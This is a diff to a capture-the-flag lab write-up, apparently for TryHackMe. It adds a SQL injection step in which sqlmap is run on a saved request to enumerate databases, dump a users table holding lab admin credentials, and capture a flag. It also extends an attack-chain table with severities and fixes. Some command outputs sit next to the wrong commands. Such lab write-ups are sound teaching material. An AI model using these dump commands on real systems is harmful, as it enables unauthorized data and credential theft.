@@ -140,14 +140,82 @@ Trying to use the same tactic to read other sensitive files. First attempt was a
 
 ![db.php-access-denied.png](/img/user/db.php-access-denied.png)
 
+Looking at the **search field** in the dashboard panel it is confirmed that SQL Injection is present.
+
+![sql-injection-confirmed 1.png](/img/user/sql-injection-confirmed%201.png)
+
+
+Running the request through Burp and sending it to sqlmap indeed reveals payloads I can use to exploit the weak database and capture the admin credentials.
+
+![sqlmap.png](/img/user/sqlmap.png)
+
+```bash
+sqlmap --batch --level=5 -r searchfield.req
+```
+
+
+```bash
+available databases [6]:  
+[*] information_schema  
+[*] mysql  
+[*] performance_schema  
+[*] phpmyadmin  
+[*] recruit_db  
+[*] sys
+```
+
+Lets enumerate the databases.
+
+```bash
+sqlmap --batch --level=5 -r searchfield.req --dbs
+```
+
+```bash
+Database: recruit_db  
+[2 tables]  
++------------+  
+| candidates |  
+| users      |  
++------------+
+```
+
+```bash
+sqlmap --batch --level=5 -r searchfield.req -D recruit_db --tables
+```
+
+Lets enumerate the tables. 
+
+```bash
+Database: recruit_db  
+Table: users  
+[1 entry]  
++----+----------------+----------+  
+| id | password       | username |  
++----+----------------+----------+  
+| 1  | admin@001admin | admin    |  
++----+----------------+----------+
+```
+
+```bash
+sqlmap --batch --level=5 -r searchfield.req -D recruit_db -T users --dump
+```
+
+
+Now dumping all of the contents from **users** table reveals the administrator password.  
+
+```
+THM{LOGGED_IN_ADM1N1}
+```
 ------
 
 ## Attack Pattern Analysis (APA) aka Attack Chain
 
-
+Overview of the attack chain
+nmap > weak endpoint vulnerable to Open Redirect  > HR creds > dashboard panel > vulnerable search field SQL injection > 
 
 | Vulnerability                                                                  | Severity | Remediation                                                                                                               |
 | ------------------------------------------------------------------------------ | -------- | ------------------------------------------------------------------------------------------------------------------------- |
 | Exposed usernames on unprotected endpoints                                     | Medium   | Setup login mechanisms such as by OAuth/JWT/2FA                                                                           |
 | Vulnerable library allowing multiple URI schemes and missing proper validation | High     | Use a python library which automatically rejects passing local files in the URL and preventing the abuse of Open Redirect |
 | Open Redirect flaw                                                             | Critical |                                                                                                                           |
+| SQL Injection                                                                  | High     |                                                                                                                           |
